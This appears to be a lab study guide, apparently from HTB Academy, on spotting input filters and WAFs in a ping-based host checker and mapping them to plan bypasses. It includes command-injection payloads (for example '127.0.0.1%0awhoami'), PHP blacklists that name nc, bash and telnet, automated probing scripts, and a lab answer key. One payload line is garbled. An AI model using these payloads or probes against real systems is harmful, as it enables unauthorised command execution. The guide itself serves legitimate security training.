# Identifying Filters and WAF Protection

> **🛡️ Defense Detection:** Systematic identification of input filters, blacklisted characters, and WAF protection mechanisms

## Overview

Even when developers attempt to secure web applications against injections, implementations may still be exploitable if not properly coded. Common mitigation techniques include:

1. **Blacklisted characters and words** on the back-end
2. **Input validation filters** at the application level  
3. **Web Application Firewalls (WAFs)** with broader detection scope
4. **Pattern-based detection** systems

This section demonstrates how to identify what is being blocked and develop systematic bypass strategies.

**Focus:** Methodical filter detection and characterization to develop targeted bypass techniques.

---

## Filter/WAF Detection

### Initial Detection Signs

**Scenario:** Enhanced Host Checker application with security mitigations

**Previous Working Payload:**
```bash
127.0.0.1; whoami
```

**Current Response:**
```html
Invalid input
```

**Detection Indicators:**

**Application-Level Filtering:**
- Error message appears in normal application output
- Standard web application styling maintained
- Response includes original form structure
- Error displayed where command output would appear

**WAF-Level Filtering:**
- Different error page format
- May include IP address and request details
- Generic security-focused error message
- Response may lack application-specific styling

### Response Analysis

**Application Filter Response:**
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<div class="host-checker">
    <form>
        <input type="text" value="127.0.0.1; whoami">
        <button>Check</button>
    </form>
    <div class="output">
        Invalid input
    </div>
</div>
```

**WAF Response (Example):**
```html
HTTP/1.1 403 Forbidden
Content-Type: text/html

<html>
<head><title>Access Denied</title></head>
<body>
    <h1>Request Blocked</h1>
    <p>Your request was blocked by security policy.</p>
    <p>Client IP: 192.168.1.100</p>
    <p>Request ID: ABC123</p>
</body>
</html>
```

---

## Blacklisted Characters

### Common Implementation

**Typical PHP Blacklist Filter:**
```php
$blacklist = ['&', '|', ';', '&&', '||', 'sh', 'bash', 'nc', 'telnet', ...];

foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
        exit();
    }
}
```

**Filter Characteristics:**
- **String-based detection** - Searches for exact character matches
- **Case-sensitive** or case-insensitive matching
- **Partial matches** - Any occurrence triggers block
- **Word boundaries** - May or may not respect word boundaries

### Filter Logic Variations

**Simple Character Blacklist:**
```php
// Basic character filtering
if (strpos($input, ';') !== false || strpos($input, '&') !== false) {
    die("Invalid input");
}
```

**Regex-Based Filtering:**
```php
// Pattern-based filtering
if (preg_match('/[;&|`$()]/i', $input)) {
    die("Invalid input");
}
```

**Word-Based Filtering:**
```php
// Command blacklisting
$blocked_commands = ['whoami', 'cat', 'ls', 'nc', 'bash'];
foreach ($blocked_commands as $cmd) {
    if (stripos($input, $cmd) !== false) {
        die("Invalid input");
    }
}
```

**Combined Filtering:**
```php
// Multi-layer filtering
function isBlocked($input) {
    $char_blacklist = [';', '&', '|', '`', '$'];
    $cmd_blacklist = ['whoami', 'cat', 'ls', 'sh'];
    
    // Check characters
    foreach ($char_blacklist as $char) {
        if (strpos($input, $char) !== false) return true;
    }
    
    // Check commands
    foreach ($cmd_blacklist as $cmd) {
        if (stripos($input, $cmd) !== false) return true;
    }
    
    return false;
}
```

---

## Systematic Filter Identification

### Step-by-Step Testing Methodology

**Step 1: Baseline Verification**
```http
# Confirm normal functionality still works
ip=127.0.0.1

# Expected: Normal ping output
# Result: ✅ Working - baseline established
```

**Step 2: Individual Character Testing**

**Test each injection operator separately:**

**Semicolon Test:**
```http
ip=127.0.0.1%3b
```
**Expected Result:** `Invalid input` (✗ Blocked)

**AND Operator Test:**
```http
ip=127.0.0.1%26%26
```
**Expected Result:** `Invalid input` (✗ Blocked)

**OR Operator Test:**
```http
ip=127.0.0.1%7c%7c
```
**Expected Result:** `Invalid input` (✗ Blocked)

**Pipe Test:**
```http
ip=127.0.0.1%7c
```
**Expected Result:** `Invalid input` (✗ Blocked)

**Background Test:**
```http
ip=127.0.0.1%26
```
**Expected Result:** `Invalid input` (✗ Blocked)

**New Line Test:**
```http
ip=127.0.0.1%0a
```
**Expected Result:** Normal ping output (✅ **Not blocked!**)

### Character-by-Character Analysis

**Isolate each special character:**

```bash
# Test individual characters that might be filtered
;    → %3b     → "Invalid input" (blocked)
&    → %26     → "Invalid input" (blocked)  
|    → %7c     → "Invalid input" (blocked)
`    → %60     → "Invalid input" (blocked)
$    → %24     → "Invalid input" (blocked)
(    → %28     → Normal response (allowed)
)    → %29     → Normal response (allowed)
\n   → %0a     → Normal response (allowed) ⭐
\r   → %0d     → Test needed
\t   → %09     → Test needed
```

### HTB Academy Lab Results

**Question:** Which of (new-line, &, |) is not blacklisted by the web application?

**Testing Process:**

**New Line Test:**
```http
ip=127.0.0.1%0a
# Result: Normal ping output - NOT BLOCKED ✅
```

**Ampersand Test:**
```http
ip=127.0.0.1%26  
# Result: "Invalid input" - BLOCKED ✗
```

**Pipe Test:**
```http
ip=127.0.0.1%7c
# Result: "Invalid input" - BLOCKED ✗
```

**Answer:** **new-line** (`\n` / `%0a`) is not blacklisted by the web application.

---

## Advanced Filter Detection

### Testing Alternative Characters

**Extended Character Set:**
```bash
# Test various encodings and alternatives
\n    → %0a     → newline (often allowed)
\r    → %0d     → carriage return  
\r\n  → %0d%0a  → Windows line ending
\t    → %09     → tab character
\v    → %0b     → vertical tab
\f    → %0c     → form feed
space → %20     → regular space
```

**Unicode Alternatives:**
```bash
# Unicode variations (if application supports)
;     → %3b     → standard semicolon
;     → %uff1b  → fullwidth semicolon
&     → %26     → standard ampersand  
＆    → %ef%bc%86 → fullwidth ampersand
```

### Command Detection Testing

**After identifying allowed separators, test commands:**

**Basic Commands:**
```http
# Using newline separator
ip=127.0.0.1%0awhoami
ip=127.0.0.1%0aid  
ip=127.0.0.1%0alstp=127.0.0.1%0acat
```

**Alternative Commands:**
```bash
# If basic commands are blocked, try alternatives
whoami   → w       → /usr/bin/whoami
id       → /usr/bin/id
ls       → dir (Windows) → /bin/ls
cat      → type (Windows) → more → less
```

### Payload Structure Analysis

**Test different payload positions:**

**Prefix Injection:**
```http
ip=whoami%0a127.0.0.1
```

**Suffix Injection:**
```http
ip=127.0.0.1%0awhoami
```

**Middle Injection:**
```http
ip=127%0awhoami%0a.0.0.1
```

**Multiple Commands:**
```http
ip=127.0.0.1%0awhoami%0aid%0als
```

---

## Filter Bypass Strategy Development

### Systematic Approach

**Phase 1: Character Mapping**
```bash
# Create character allowlist/blocklist
✅ Allowed: \n (\r ?) \t (?) ( ) space numbers letters . 
✗ Blocked: ; & | ` $ && || 
? Unknown: \r \t \v \f unicode_alternatives
```

**Phase 2: Command Testing**
```bash
# Test command categories
✅ Basic: whoami id ls cat
✗ Network: nc netcat telnet  
✗ Shells: sh bash zsh
? File: head tail grep awk
```

**Phase 3: Payload Optimization**
```bash
# Build working payload using allowed characters
Base: 127.0.0.1%0awhoami
Extended: 127.0.0.1%0awhoami%0aid
Complex: 127.0.0.1%0a/usr/bin/whoami%0a/usr/bin/id
```

### Documentation Template

**Filter Analysis Report:**
```markdown
## Target: Host Checker Application

### Allowed Characters:
- Alphanumeric: a-z A-Z 0-9 ✅
- Special: . space ( ) ✅  
- Separators: \n (\r?) ✅
- Encoding: URL encoding ✅

### Blocked Characters:
- Operators: ; & | && || ✗
- Substitution: ` $ $() ✗
- [Additional testing needed for: \r \t \v \f]

### Allowed Commands:
- System info: whoami id ✅
- File operations: [testing needed]
- Network: [testing needed]

### Working Payloads:
- Basic: 127.0.0.1%0awhoami
- Multi-command: 127.0.0.1%0awhoami%0aid
```

---

## Common Filter Patterns

### Application-Level Filters

**Simple Blacklist:**
- Blocks common injection characters
- Case-sensitive string matching
- No context awareness
- Easy to bypass with alternatives

**Advanced Application Filters:**
- Regex pattern matching
- Command word detection
- Context-aware filtering
- Parameter validation

### WAF-Level Filters

**Signature-Based:**
- Known attack pattern detection
- Multi-parameter correlation
- HTTP header analysis
- Rate limiting integration

**Behavioral Analysis:**
- Anomaly detection
- Machine learning models
- Statistical analysis
- Dynamic rule adaptation

### Hybrid Approaches

**Multi-Layer Defense:**
1. **Client-side validation** (easily bypassed)
2. **Application input filters** (character/command blocking)
3. **WAF protection** (pattern-based detection)
4. **System-level controls** (sandboxing, permissions)

---

## Testing Automation

### Systematic Character Testing Script

**Python Filter Detector:**
```python
import requests
import urllib.parse

def test_character_filter(base_url, param_name, base_value):
    """Test individual characters for filtering"""
    
    test_chars = [';', '&', '|', '`', '$', '(', ')', '\n', '\r', '\t']
    results = {}
    
    for char in test_chars:
        # Test character individually
        payload = base_value + urllib.parse.quote(char)
        
        response = requests.post(base_url, data={param_name: payload})
        
        if "Invalid input" in response.text:
            results[char] = "BLOCKED"
        elif "ping" in response.text.lower():
            results[char] = "ALLOWED"
        else:
            results[char] = "UNKNOWN"
    
    return results

# Usage
results = test_character_filter(
    "http://target.com/check.php", 
    "ip", 
    "127.0.0.1"
)

for char, status in results.items():
    print(f"Character '{char}' (\\x{ord(char):02x}): {status}")
```

### Command Testing Automation

**Command Enumeration:**
```python
def test_commands(base_url, param_name, separator):
    """Test common commands using identified separator"""
    
    commands = ['whoami', 'id', 'ls', 'cat', 'pwd', 'uname']
    base_payload = "127.0.0.1"
    
    for cmd in commands:
        payload = base_payload + separator + cmd
        encoded_payload = urllib.parse.quote(payload, safe='')
        
        response = requests.post(base_url, data={param_name: encoded_payload})
        
        if "Invalid input" in response.text:
            print(f"Command '{cmd}': BLOCKED")
        elif cmd in response.text or len(response.text) > 200:
            print(f"Command '{cmd}': ALLOWED")
        else:
            print(f"Command '{cmd}': UNKNOWN")
```

---

## Key Takeaways

### Filter Identification Best Practices

**1. Systematic Testing:**
- Start with individual characters
- Test all injection operators
- Document allowed/blocked patterns
- Build comprehensive filter map

**2. Incremental Complexity:**
- Begin with simple payloads
- Gradually increase complexity
- Test command combinations
- Validate bypass techniques

**3. Documentation:**
- Maintain detailed filter analysis
- Track working payloads
- Note environmental constraints
- Plan bypass strategies

### Success Indicators

**✅ Effective Filter Mapping:**
- Clear allowed/blocked character list
- Working injection operator identified
- Command execution confirmed
- Bypass strategy developed

**🔍 Further Investigation Needed:**
- Mixed/inconsistent responses
- Partial command execution
- Timing-based differences
- Context-dependent filtering

This systematic approach to filter identification provides the foundation for developing effective bypass techniques and ensures comprehensive understanding of the target application's security mechanisms. 